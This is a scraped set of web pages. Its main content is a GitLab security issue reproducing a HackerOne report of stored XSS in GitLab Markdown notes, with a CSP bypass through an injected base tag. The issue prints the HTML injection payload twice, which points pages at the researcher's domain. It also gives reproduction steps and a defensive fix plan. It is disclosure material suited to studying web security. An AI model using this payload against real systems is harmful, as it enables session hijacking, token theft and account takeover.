=== Content from gitlab.com_413a2f88_20250114_223035.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-1175.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-1175.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-1175.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-1175.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  Apr 04, 2022

  [581a2e37](/gitlab-org/cves/-/commit/581a2e37353e67c63fa779674f06e03b2528f78e)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/581a2e37353e67c63fa779674f06e03b2528f78e)
  繚
  581a2e37

  [ GitLab Bot ](/gitlab-bot) authored Apr 04, 2022

  581a2e37

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/581a2e37353e67c63fa779674f06e03b2528f78e)
  [ GitLab Bot ](/gitlab-bot) authored Apr 04, 2022

Loading



=== Content from packetstormsecurity.com_c4faff99_20250114_223033.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

[About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from gitlab.com_b8993f55_20250114_223037.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored XSS in Notes (with CSP bypass for gitlab.com)

**[HackerOne report #1481207](https://hackerone.com/reports/1481207)** by `joaxcar` on 2022-02-14, assigned to [@ngeorge1](/ngeorge1 "Nikhil George"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

#### Summary

I read the issue [345657](https://gitlab.com/gitlab-org/gitlab/-/issues/345657 "Stored XSS on issue comments and other pages which contain notes") which handles the XSS in notes reported in Hackerone report [1398305](https://hackerone.com/reports/1398305). This issue fixes the reported XSS but leaves the HTML injection that was also mentioned. I don't know how you deal with these situations, but I thought I report this, and you can decide :)

The issue linked above shows how a user can inject HTML in any Note (actually any Markdown it seems. For example wiki pages and issue descriptions) by abusing [syntax\_highlight\_filter.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/c2e5d7b89b84cc5b44575592bb706ef75c3d1bbb/lib/banzai/filter/syntax_highlight_filter.rb).

There are more ways to take this injection and weaponize it than the patched Emoji tag. I have a list of additional vectors but though that I would report the worst one (proper full stored XSS) and explain more if you decide to accept the report. To not waste our time.

I have multiple ways to inject `script` tags, but it looks like you have hardened your CSP? None of the old bypasses worked for me. But it still seems that you have not blocked the `base` tag. And fortunately for me, the injection let me pass in `base` tags. So by entering this into an issue description or wiki page

```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://joaxcar.com>
<pre x=&#34;">
<code></code></pre>
```

All relative links in the page will try to load their data from my site "joaxar.com". If we then open DevTools and reload the page, we will see the name of all files that failed to load. In the case of an issue page, we have this script

```
http://joaxcar.com/assets/webpack/hello.4948f350.chunk.js
```

and for a wiki page we have

```
https://joaxcar.com/assets/webpack/top_nav.c9763726.chunk.js
```

[![after.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/070a9c1a03025b70d7b3b30d894a2e22fc3a4abf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63393131363137662d643538642d346631342d386266392d3136336339313638383766352f61667465722e706e67)

Now I just have to create these files on my domain, and they will load and bypass CSP (as these script tags will have nonce in place and can thus load anything)

[![payload.jpg](data:image/gif;base64...)](https://user-content.gitlab-static.net/10ed1799d1b2999d85cf2f4bcd1904007eadec89/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34653032353534652d653332632d346166362d623839632d3164663930663833313335382f7061796c6f61642e6a7067)

#### Steps to reproduce

1. log in as a user on Gitlab.com
2. go to any project (or create one), and add a new issue
3. enter this as the description (replace with your own server if you need to generate new scripts on your own domain)

```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://joaxcar.com>
<pre x=&#34;">
<code></code></pre>
```

4. save the issue
5. open DevTools (f12) and look for failing script imports
6. create the missing script on your domain containing

```
alert(document.domain)
```

7. reload the page and the popup should pop

[![xssbase.jpg](data:image/gif;base64...)](https://user-content.gitlab-static.net/5b1bf53058806737c19fed3c6f7a18a56d456386/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31643838626464382d613732392d343365322d396332662d3061363639636133326465312f787373626173652e6a7067)

##### Impact

Stored XSS in gitlab.com

There are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)

##### What is the current *bug* behavior?

HTML injection in Markdown

##### What is the expected *correct* behavior?

Should not be possible

##### Output of checks

This bug happens on GitLab.com

#### Impact

Stored XSS in gitlab.com

There are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [payload.jpg](https://h1.sec.gitlab.net/a/4e02554e-e32c-4af6-b89c-1df90f831358/payload.jpg)
* [xssbase.jpg](https://h1.sec.gitlab.net/a/1d88bdd8-a729-43e2-9c2f-0a669ca32de1/xssbase.jpg)
* [after.png](https://h1.sec.gitlab.net/a/c911617f-d58d-4f14-8bf9-163c916887f5/after.png)

### Implementation Plan

| Issue | Description | Department |
| --- | --- | --- |
| # | Add strict validation allowing only number range for [`data-sourcepos` attribute](https://gitlab.com/gitlab-org/gitlab/blob/7a6fb02d8c4c6a9755dcc849913813b9c57cf35c/lib/banzai/filter/syntax_highlight_filter.rb#L31) | [backend](/gitlab-org/gitlab/-/issues?label_name=backend "Issues that require backend work") |
| # | Escape user input [when generating highlight html](https://gitlab.com/gitlab-org/gitlab/blob/7a6fb02d8c4c6a9755dcc849913813b9c57cf35c/lib/banzai/filter/syntax_highlight_filter.rb#L59) | [backend](/gitlab-org/gitlab/-/issues?label_name=backend "Issues that require backend work") |
| [#241857 (closed)](https://gitlab.com/gitlab-org/gitlab/-/issues/241857 "Remove v-html from app/assets/javascripts/vue_shared/components/markdown/field.vue") | Add `v-safe-html` for rendering markdown | [frontend](/gitlab-org/gitlab/-/issues?label_name=frontend "Issues for the Frontend team. Covers everything related to the way GitLab behaves (and, to an extent, looks) inside your browser.") |
| # | Avoid generating html strings in [gl\_field\_error.js](https://gitlab.com/gitlab-org/gitlab/blob/79ed530ac23b053e3905950b8c0e64063284dab6/app/assets/javascripts/gl_field_error.js#L66) | [frontend](/gitlab-org/gitlab/-/issues?label_name=frontend "Issues for the Frontend team. Covers everything related to the way GitLab behaves (and, to an extent, looks) inside your browser.") |
| [#338075 (closed)](https://gitlab.com/gitlab-org/gitlab/-/issues/338075 "Add `base-uri` directive in the CSP of GitLab.com") | Add `base-uri` directive in the CSP of GitLab.com | [security](/gitlab-org/gitlab/-/issues?label_name=security "Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/") |

Edited Feb 25, 2022 by [Dheeraj Joshi](/djadmin)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


